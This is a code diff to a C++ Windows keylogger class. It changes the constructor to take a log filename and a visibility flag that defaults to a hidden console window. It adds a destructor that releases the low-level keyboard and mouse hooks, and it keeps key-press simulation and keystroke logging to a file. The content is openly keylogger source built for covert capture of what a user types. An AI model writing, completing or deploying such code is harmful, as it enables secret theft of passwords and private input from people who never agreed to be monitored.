@@ -68,7 +68,7 @@ class KeyLogger {
 					// Simulate a key press on 'D' instead
 					keybd_event(0x44,                       // the key 'D'
 								0x0,                        // i-net says doesn't matter
-								KEYEVENTF_EXTENDEDKEY | 0,  // \?
+								KEYEVENTF_EXTENDEDKEY,  // \?
 							0 );                          	// not needed
 					// Simulate a key release
 					keybd_event(0x44,                       // the key 'D'
@@ -194,8 +194,8 @@ class KeyLogger {
 			std::stringstream output;
 			HWND foreground = GetForegroundWindow();
 			DWORD threadID;
-
 			char title[300];
+
 			if (foreground)
 			{
 				//make log title
@@ -222,10 +222,9 @@ class KeyLogger {
 
 	public:
 		// Constructor
-		KeyLogger ()
+		KeyLogger (char output_filename[], bool visible=false)
+				:output_filename(output_filename), visible(visible)
 		{
-			this->visible = false;						//DEFAULT - change this!!
-			this->output_filename = ".\\logfile.log";	//DEFAULT - change this!!
 			this->mouse_direction_modifier = 1; // direction - right
 			if (this->visible) {
 				ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
@@ -237,6 +236,16 @@ class KeyLogger {
 			this->output_file.open(this->output_filename, std::ios_base::app);
 		}
 
+		// destructor
+		// - freeing/releasing object resources, undoing changes. 
+		~KeyLogger()
+		{
+			// releasing hooks
+			this->ReleaseLowLvlKeybdHook();
+			this->ReleaseLowLvlMouseHook();
+			output_file.close(); 	// closing open handle to log file
+		}
+		
 		// hook SETTER functions
 		void SetLowLvLKeybdHook()
 		{
@@ -279,7 +288,7 @@ class KeyLogger {
 };
 
 
-KeyLogger* KeyLogger_obj = new KeyLogger();
+KeyLogger* KeyLogger_obj = new KeyLogger(".\\Keylogger.log");
 
 
 LRESULT CALLBACK KeyLogger::LowLvlKeybdHookCallback(int nCode, WPARAM wParam, LPARAM lParam)
